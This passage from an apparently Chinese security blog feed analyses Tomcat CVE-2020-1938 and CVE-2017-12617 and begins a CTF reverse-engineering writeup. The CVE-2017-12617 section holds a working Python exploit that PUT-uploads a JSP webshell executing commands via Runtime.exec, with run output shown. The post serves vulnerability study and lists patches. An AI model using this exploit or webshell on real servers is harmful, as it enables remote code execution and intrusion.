response.setStatus(<span class="number">403</span>);</span><br><span class="line">+                            setErrorState(ErrorState.CLOSE_CLEAN, <span class="keyword">null</span>);</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4><span id="prequest-process">Request Process</span><a href="#prequest-process" class="header-anchor">#</a></h4><p>预处理后转回<code>AjpProcessor</code>类进行请求处理，<code>adapter</code>根据<code>web.xml</code>中的设置选择<code>JspServlet</code>或者<code>DefaultServlet</code>进行处理</p><p><code>./java/org/apache/coyote/ajp/AjpProcessor.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">187</span>            <span class="comment">// Process the request in the adapter</span></span><br><span class="line">            <span class="keyword">if</span> (!getErrorState().isError()) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    rp.setStage(org.apache.coyote.Constants.STAGE_SERVICE);</span><br><span class="line">                    adapter.service(request, response);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedIOException e) &#123;</span><br><span class="line">                    setErrorState(ErrorState.CLOSE_NOW, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.error(sm.getString(<span class="string">"ajpprocessor.request.process"</span>), t);</span><br><span class="line">                    <span class="comment">// 500 - Internal Server Error</span></span><br><span class="line">                    response.setStatus(<span class="number">500</span>);</span><br><span class="line">                    setErrorState(ErrorState.CLOSE_CLEAN, t);</span><br><span class="line">                    getAdapter().log(request, response, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p><strong>Jsp后缀处理</strong></p><p><code>./java/org/apache/jasper/servlet/JspServlet.java</code> :<code>service</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">338</span>            <span class="keyword">boolean</span> precompile = preCompile(request);</span><br><span class="line"><span class="number">339</span>            serviceJspFile(request, response, jspUri, precompile);</span><br></pre></td></tr></table></figure><p><code>./java/org/apache/jasper/servlet/JspServlet.java</code> :<code>serviceJspFile</code></p><p>新建或获取当前的<code>wapper</code>，处理<code>jsp</code>文件，将结果作为<code>response</code>返回</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">377</span>        <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">                <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Check if the requested JSP page exists, to avoid</span></span><br><span class="line">                    <span class="comment">// creating unnecessary directories and files.</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">null</span> == context.getResource(jspUri)) &#123;</span><br><span class="line">                        handleMissingResource(request, response, jspUri);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    wrapper = <span class="keyword">new</span> JspServletWrapper(config, options, jspUri,</span><br><span class="line">                                                    rctxt);</span><br><span class="line">                    rctxt.addWrapper(jspUri,wrapper);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="comment">//调用JspServletWrapper执行请求的jsp文件</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            wrapper.service(request, response, precompile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">            handleMissingResource(request, response, jspUri);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><strong>普通后缀处理</strong></p><p><code>DefaultSerlvet</code>类继承自<code>HttpServlet</code>，对于<code>Get</code>请求，使用<code>doGet</code>方法读取对应的内容作为<code>response</code></p><p><code>./java/javax/servlet/http/HttpServlet.java</code>:<code>service</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">619         if (method.equals(METHOD_GET)) &#123;</span><br><span class="line">            long lastModified &#x3D; getLastModified(req);</span><br><span class="line">            if (lastModified &#x3D;&#x3D; -1) &#123;</span><br><span class="line">                &#x2F;&#x2F; servlet doesn&#39;t support if-modified-since, no reason</span><br><span class="line">                &#x2F;&#x2F; to go through further expensive logic</span><br><span class="line">                doGet(req, resp);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                long ifModifiedSince;</span><br><span class="line">                try &#123;</span><br><span class="line">                    ifModifiedSince &#x3D; req.getDateHeader(HEADER_IFMODSINCE);</span><br><span class="line">                &#125; catch (IllegalArgumentException iae) &#123;</span><br><span class="line">                    &#x2F;&#x2F; Invalid date header - proceed as if none was set</span><br><span class="line">                    ifModifiedSince &#x3D; -1;</span><br><span class="line">                &#125;</span><br><span class="line">                if (ifModifiedSince &lt; (lastModified &#x2F; 1000 * 1000)) &#123;</span><br><span class="line">                    &#x2F;&#x2F; If the servlet mod time is later, call doGet()</span><br><span class="line">                    &#x2F;&#x2F; Round down to the nearest second for a proper compare</span><br><span class="line">                    &#x2F;&#x2F; A ifModifiedSince of -1 will always be less</span><br><span class="line">                    maybeSetLastModified(resp, lastModified);</span><br><span class="line">                    doGet(req, resp);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><h4><span id="pli-yong-fang-fa">利用方法</span><a href="#pli-yong-fang-fa" class="header-anchor">#</a></h4><p>使用<code>Ajp</code>协议请求网站根目录下的文件</p><h4><span id="pfang-hu-fang-fa">防护方法</span><a href="#pfang-hu-fang-fa" class="header-anchor">#</a></h4><ol><li>原本默认开启的AJP服务被设置为默认关闭</li><li>建议用户在使用AJP服务时使用安全认证机制</li><li>对含有任意请求属性的访问返回403（拒绝exp中控制设置的属性的ajp请求）</li><li>patch链接：<ul><li><a href="https://github.com/apache/tomcat/commit/86768e423a6ca0ae32e64acb65c9ae8dccf52256" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/86768e423a6ca0ae32e64acb65c9ae8dccf52256</a></li><li><a href="https://github.com/apache/tomcat/commit/38a0fd9bb287e9e70eb61a5d8ea12cf602fb6398" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/38a0fd9bb287e9e70eb61a5d8ea12cf602fb6398</a></li><li><a href="https://github.com/apache/tomcat/commit/2e108583e8665fdc61970137a409f15c4df3a36f" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/2e108583e8665fdc61970137a409f15c4df3a36f</a></li></ul></li></ol><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><p><a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">AJP协议官方文档</a></p></li><li><p><a href="https://blog.csdn.net/silencediors/article/details/104484178" target="_blank" rel="noopener">CVE-2020-1938漏洞分析</a></p></li><li><p><a href="https://github.com/ycdxsb/CVEs/tree/master/tomcat-CVE-2020-1938" target="_blank" rel="noopener">CVE-2020-1938 EXP</a></p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-12617</title>
    <url>/e50797f2.html</url>
    <content><![CDATA[<h3><span id="pji-ben-xin-xi">基本信息</span><a href="#pji-ben-xin-xi" class="header-anchor">#</a></h3><blockquote><p>When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.</p></blockquote><a id="more"></a><p><strong>影响范围：</strong></p><ul><li>7.0.0 - 7.0.81</li><li>8.0.0.RC1 - 8.0.46</li><li>8.5.0 - 8.5.22</li><li>9.0.0.M1 - 9.0.0</li></ul><p><strong>描述：</strong></p><p>当在<code>Tomcat</code>的<code>web.xml</code>配置文件中设置<code>readonly</code>为<code>false</code>时，攻击者可以通过<code>PUT</code>请求能够上传任意文件，当上传恶意的<code>jsp</code>文件时，就可以通过<code>jsp</code>的<code>webshell</code>文件获得<code>shell</code></p><h3><span id="plou-dong-fu-xian">漏洞复现</span><a href="#plou-dong-fu-xian" class="header-anchor">#</a></h3><h4><span id="phuan-jing-pei-zhi">环境配置</span><a href="#phuan-jing-pei-zhi" class="header-anchor">#</a></h4><p><strong>Step1</strong> ：<a href="http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz" target="_blank" rel="noopener">http://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.tar.gz</a></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-09-18-044448.jpg" alt="image-20200916170033271"></p><p><strong>Step 2</strong>：修改配置文件，增加<code>readonly = false</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;debug&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;0&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;listings&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">+        &lt;init-param&gt;</span><br><span class="line">+            &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">+            &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">+        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br></pre></td></tr></table></figure><h4><span id="pgong-ji">攻击</span><a href="#pgong-ji" class="header-anchor">#</a></h4><p><strong>Step1</strong> ：构造<code>PUT</code>请求验证漏洞是否存在</p><p>请求如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def verify(url,port):</span><br><span class="line">    vul_url &#x3D; url+&quot;:&quot;+port</span><br><span class="line">    print(&quot;target:&quot;,vul_url)</span><br><span class="line"></span><br><span class="line">    poc_path &#x3D; urlparse.urljoin(vul_url,&quot;test.txt&quot;)</span><br><span class="line">    print(poc_path)</span><br><span class="line">    payload &#x3D; &quot;This is Vulnerable CVE-2017-12617!&quot;</span><br><span class="line"></span><br><span class="line">    poc_req &#x3D; requests.put(url &#x3D; poc_path,data &#x3D; payload, verify &#x3D; False)</span><br><span class="line"></span><br><span class="line">    poc_content &#x3D; requests.get(url &#x3D; poc_path,verify &#x3D; False).content</span><br><span class="line">    if(&quot;CVE-2017-12617&quot; in poc_content):</span><br><span class="line">        print(&quot;CVE-2017-12617 exsits in this target!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;No CVE-2017-12617 in this target!&quot;)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python CVE-2017-12617.py -u http:&#x2F;&#x2F;47.100.18.67 -p 8080 --choice verify</span><br><span class="line">(&#39;target:&#39;, &#39;http:&#x2F;&#x2F;47.100.18.67:8080&#39;)</span><br><span class="line">http:&#x2F;&#x2F;47.100.18.67:8080&#x2F;test.txt</span><br><span class="line">CVE-2017-12617 exsits in this target!</span><br></pre></td></tr></table></figure><p>同时可以看到在根目录下出现了<code>test.txt</code>文件</p><p><strong>Step2：</strong> 上传恶意jsp文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def attack(url,port):</span><br><span class="line">    payload &#x3D; &quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;password&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">    vul_url &#x3D; url+&quot;:&quot;+port</span><br><span class="line">    print(&quot;target:&quot;,vul_url)</span><br><span class="line"></span><br><span class="line">    #由于本身不允许直接上传jsp文件，但可能可以通过构造绕过</span><br><span class="line">    #参考:https:&#x2F;&#x2F;www.cnblogs.com&#x2F;leixiao-&#x2F;p&#x2F;10264236.html</span><br><span class="line">    poc_path &#x3D; urlparse.urljoin(vul_url,&quot;poc.jsp&#x2F;&quot;)</span><br><span class="line">    print(poc_path)</span><br><span class="line"></span><br><span class="line">    poc_req &#x3D; requests.put(url &#x3D; poc_path,data &#x3D; payload, verify &#x3D; False)</span><br><span class="line">    print(poc_req.status_code)</span><br><span class="line">    poc_content &#x3D; requests.get(url &#x3D; urlparse.urljoin(vul_url,&quot;poc.jsp&quot;)+&quot;?pwd&#x3D;password&amp;i&#x3D;whoami&quot;,verify &#x3D; False).content</span><br><span class="line">    if(poc_content&#x3D;&#x3D;&quot;&quot;):</span><br><span class="line">        print(&quot;Attack failed!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        # print(&quot;whoami result:&quot;,poc_content)</span><br><span class="line">        print(&quot;Attack success!&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python CVE-2017-12617.py -u http:&#x2F;&#x2F;47.100.18.67 -p 8080 --choice attack</span><br><span class="line">(&#39;target:&#39;, &#39;http:&#x2F;&#x2F;47.100.18.67:8080&#39;)</span><br><span class="line">http:&#x2F;&#x2F;47.100.18.67:8080&#x2F;poc.jsp&#x2F;</span><br><span class="line">Attack success!</span><br></pre></td></tr></table></figure><p><code>http://47.100.18.67:8080/poc.jsp?pwd=password&amp;i=ls</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-09-18-044458.jpg" alt="image-20200916184617682"></p><h3><span id="pyuan-li">原理</span><a href="#pyuan-li" class="header-anchor">#</a></h3><p><code>./conf/web.xml</code></p><p>从配置文件可以看到，<code>.jsp</code>和<code>.jspx</code>后缀会交给<code>org.apache.jasper.servlet.JspServlet</code>类进行处理，其余交给<code>org.apache.catalina.servlets.DefaultServlet</code>类处理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">104         &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">105         &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">...</span><br><span class="line">251         &lt;servlet-name&gt;jsp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">252         &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">...</span><br><span class="line">382     &lt;servlet-mapping&gt;</span><br><span class="line">383         &lt;servlet-name&gt;default&lt;&#x2F;servlet-name&gt;</span><br><span class="line">384         &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;</span><br><span class="line">385     &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">...</span><br><span class="line">388     &lt;servlet-mapping&gt;</span><br><span class="line">389         &lt;servlet-name&gt;jsp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">390         &lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt;</span><br><span class="line">391         &lt;url-pattern&gt;*.jspx&lt;&#x2F;url-pattern&gt;</span><br><span class="line">392     &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure><h4><span id="pdefaultservlet">DefaultServlet</span><a href="#pdefaultservlet" class="header-anchor">#</a></h4><p><code>./java/org/apache/catalina/servlets/DefaultServlet.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            <span class="comment">// 检查readOnly</span></span><br><span class="line">    <span class="keyword">if</span> (readOnly) &#123;</span><br><span class="line">        resp.sendError(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String path = getRelativePath(req);</span><br><span class="line">            <span class="comment">// 判断文件是否已经存在</span></span><br><span class="line">    <span class="keyword">boolean</span> exists = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        resources.lookup(path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        exists = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> result = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Temp. content file used to support partial PUT</span></span><br><span class="line">    File contentFile = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    Range range = parseContentRange(req, resp);</span><br><span class="line"></span><br><span class="line">    InputStream resourceInputStream = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append data specified in ranges to existing content for this</span></span><br><span class="line">    <span class="comment">// resource - create a temp. file on the local filesystem to</span></span><br><span class="line">    <span class="comment">// perform this operation</span></span><br><span class="line">    <span class="comment">// Assume just one range is specified for now</span></span><br><span class="line">    <span class="comment">// 得到put请求的内容</span></span><br><span class="line">    <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">        contentFile = executePartialPut(req, range, path);</span><br><span class="line">        resourceInputStream = <span class="keyword">new</span> FileInputStream(contentFile);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resourceInputStream = req.getInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将内容输出到文件中</span></span><br><span class="line">        Resource newResource = <span class="keyword">new</span> Resource(resourceInputStream);</span><br><span class="line">        <span class="comment">// <span class="doctag">FIXME:</span> Add attributes</span></span><br><span class="line">        <span class="keyword">if</span> (exists) &#123;</span><br><span class="line">            resources.rebind(path, newResource);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resources.bind(path, newResource);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(NamingException e) &#123;</span><br><span class="line">        result = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exists) &#123;</span><br><span class="line">            resp.setStatus(HttpServletResponse.SC_NO_CONTENT);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            resp.setStatus(HttpServletResponse.SC_CREATED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        resp.sendError(HttpServletResponse.SC_CONFLICT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>判断readOnly是否开启</li><li>判断文件是否已存在</li><li>将PUT请求内容输出到文件</li></ul><h4><span id="pli-yong-fang-fa">利用方法</span><a href="#pli-yong-fang-fa" class="header-anchor">#</a></h4><p>由于<code>Tomcat</code>本身不允许上传<code>jsp</code>文件，因此选择使用<code>DefaultServlet</code>创建<code>jsp</code>文件</p><p>利用操作系统的特性：</p><ul><li>Windows不会识别空格为文件名后缀</li><li>Linux不会识别<code>/</code>为文件名后缀</li></ul><p>因此上传时设置文件名为<code>jsp%20</code>或者<code>jsp/</code>，让<code>Tomcat</code>使用<code>DefaultServlet</code>创建文件，由于系统特性，最后生成的文件为<code>jsp</code>文件，攻击者访问即可<code>get shell</code></p><h4><span id="pfang-hu-fang-fa">防护方法</span><a href="#pfang-hu-fang-fa" class="header-anchor">#</a></h4><ol><li>不启用<code>readonly</code>设置</li><li>在<code>DefaultServlet</code>中加入对<code>/</code>以及<code>%20</code>的判断</li><li>patch链接：<ul><li><a href="https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552af" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/b7e0435d17aba69f16ae9e8a78ad0f1565b552af</a></li><li><a href="https://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/b577f9a7996b92b650b1649af3c3bae11c120db9</a></li></ul></li></ol><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://www.freebuf.com/vuls/150203.html" target="_blank" rel="noopener">CVE-2017-12617-Tomcat远程代码执行漏洞复现测试</a></li><li><a href="https://github.com/ycdxsb/CVEs/tree/master/tomcat-CVE-2017-12617" target="_blank" rel="noopener">CVE-2017-12617 EXP</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>5space 线下决赛部分 writeup</title>
    <url>/762edb82.html</url>
    <content><![CDATA[<blockquote><p>所以爱会消失对不对</p></blockquote><a id="more"></a><h3><span id="pbabybrain">babybrain</span><a href="#pbabybrain" class="header-anchor">#</a></h3><p>比赛的时候用pin试了前几个9876还以为是坑，没坚持下去，我真tm脑残</p><h4><span id="pstep1-pin-yi-xia-shi-shi">step1 pin一下试试</span><a href="#pstep1-pin-yi-xia-shi-shi" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">class Shell(object):</span><br><span class="line">    def runCmd(self, cmd):</span><br><span class="line">        res &#x3D; subprocess.Popen(cmd, shell&#x3D;True, stdin&#x3D;subprocess.PIPE,</span><br><span class="line">                               stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.STDOUT)</span><br><span class="line">        sout, serr &#x3D; res.communicate()</span><br><span class="line">        return res.returncode, sout, serr, res.pid</span><br><span class="line"></span><br><span class="line">    def initPin(self, cmd):</span><br><span class="line">        res &#x3D; subprocess.Popen(cmd, shell&#x3D;True, stdin&#x3D;subprocess.PIPE,</span><br><span class="line">                               stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.STDOUT)</span><br><span class="line">        self.res &#x3D; res</span><br><span class="line"></span><br><span class="line">    def pinWrite(self, input):</span><br><span class="line">        self.res.stdin.write(input)</span><br><span class="line"></span><br><span class="line">    def pinRun(self):</span><br><span class="line">        sout, serr &#x3D; self.res.communicate()</span><br><span class="line">        return sout, serr</span><br><span class="line"></span><br><span class="line">#cmd &#x3D; &#39;.&#x2F;pin -t .&#x2F;source&#x2F;tools&#x2F;ManualExamples&#x2F;obj-intel64&#x2F;inscount0.so -- .&#x2F;Goodbye1_dump&#39;</span><br><span class="line"></span><br><span class="line">cmd &#x3D; &#39;.&#x2F;pin -t .&#x2F;source&#x2F;tools&#x2F;ManualExamples&#x2F;obj-intel64&#x2F;inscount0.so -- .&#x2F;babybrain&#x2F;bf babybrain&#x2F;brain0&#39;</span><br><span class="line"></span><br><span class="line">shell &#x3D; Shell()</span><br><span class="line"></span><br><span class="line">s &#x3D; &quot;&quot;</span><br><span class="line">import string</span><br><span class="line">chs&#x3D;string.printable</span><br><span class="line">length &#x3D; 30</span><br><span class="line">chs &#x3D; string.digits</span><br><span class="line">for i in range(length):</span><br><span class="line">    max_num &#x3D; 0</span><br><span class="line">    max_ch &#x3D; &quot;&quot;</span><br><span class="line">    for ch in chs:</span><br><span class="line">        tmp &#x3D; s + ch +(length-len(s)-1)*&#39;*&#39;+&#39;\n&#39;</span><br><span class="line">        shell.initPin(cmd)</span><br><span class="line">        shell.pinWrite(tmp)</span><br><span class="line">        sout,serr &#x3D; shell.pinRun()</span><br><span class="line">        with open(&#39;inscount.out&#39;) as f:</span><br><span class="line">            count &#x3D; f.readline().split(&#39; &#39;)[1]</span><br><span class="line">        count &#x3D; int(count)</span><br><span class="line">        print(count,tmp,sout)</span><br><span class="line">        if(count&gt;max_num):</span><br><span class="line">            max_num &#x3D; count</span><br><span class="line">            max_ch &#x3D; ch</span><br><span class="line">    s+&#x3D;max_ch</span><br><span class="line">    print(max_num,max_ch)</span><br><span class="line">    print(&#39;flag:&#39;+s)</span><br></pre></td></tr></table></figure><p>用pin可以找到如下规律</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(56705377, &#39;9876114514********************\n&#39;, &#39;good\n&#39;)</span><br><span class="line">(44776176, &#39;9876114514114514**************\n&#39;, &#39;good\n&#39;)</span><br><span class="line">(32847021, &#39;9876114514114514114514********\n&#39;, &#39;good\n&#39;)</span><br><span class="line">(20917774, &#39;9876114514114514114514114514**\n&#39;, &#39;good\n&#39;)</span><br></pre></td></tr></table></figure><p>也就是说<code>9876(114514)[1,]</code>是结果的规律，从题目看是一个payload同时过所有的brain，修改一下challenge找规律</p><h4><span id="pstep2-zhao-gui-lu">step2 找规律</span><a href="#pstep2-zhao-gui-lu" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">brain_num &#x3D; 6</span><br><span class="line"></span><br><span class="line">def md5(x):</span><br><span class="line">    m &#x3D; hashlib.md5()</span><br><span class="line">    m.update(x)</span><br><span class="line">    return m.hexdigest()</span><br><span class="line"></span><br><span class="line">def check_brain(brain, thought):</span><br><span class="line">    p &#x3D; subprocess.run([&quot;.&#x2F;bf&quot;, brain], input&#x3D;(thought+&#39;\n&#39;).encode(), stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    r &#x3D; p.stdout.strip()</span><br><span class="line">    return r &#x3D;&#x3D; b&quot;good&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    #print(&quot;Do you know what a baby is thinking in his brain?&quot;)</span><br><span class="line">    #print(&quot;If there are multiple answers, give me the shortest one.&quot;)</span><br><span class="line">    #thought &#x3D; input(&quot;&gt; &quot;).strip()</span><br><span class="line">    #assert all(x in string.digits for x in thought)</span><br><span class="line">    for _ in range(1,120):</span><br><span class="line">        thought &#x3D; &#39;9876&#39;+&#39;114514&#39;*_</span><br><span class="line">        flag &#x3D; True</span><br><span class="line">        count &#x3D; 0</span><br><span class="line">        out &#x3D; []</span><br><span class="line">        for i in range(brain_num):</span><br><span class="line">            #print(&quot;check&quot;,i)</span><br><span class="line"></span><br><span class="line">            if not check_brain(&quot;brain%d&quot;%i, thought):</span><br><span class="line">                #print(&quot;wrong&quot;)</span><br><span class="line">                flag &#x3D; False</span><br><span class="line">                out.append(0)</span><br><span class="line">                #break</span><br><span class="line">            else:</span><br><span class="line">                out.append(1)</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">        print(_,out,count)</span><br><span class="line">        if(flag):</span><br><span class="line">            print(&quot;flag&#123;%s&#125;&quot; % md5(thought.encode()))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">2 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">3 [1, 1, 0, 0, 1, 0] 3</span><br><span class="line">4 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">5 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">6 [1, 1, 0, 1, 0, 0] 3</span><br><span class="line">7 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">8 [1, 0, 1, 0, 0, 0] 2</span><br><span class="line">9 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">10 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">11 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">12 [1, 1, 0, 0, 0, 0] 2</span><br><span class="line">13 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">14 [1, 0, 0, 0, 0, 0] 1</span><br><span class="line">15 [1, 1, 1, 0, 0, 0] 3</span><br><span class="line">16 [1, 0, 0, 0, 1, 0] 2</span><br><span class="line">17 [1, 0, 0, 1, 0, 0] 2</span><br><span class="line">18 [1, 1, 0, 0, 0, 0] 2</span><br><span 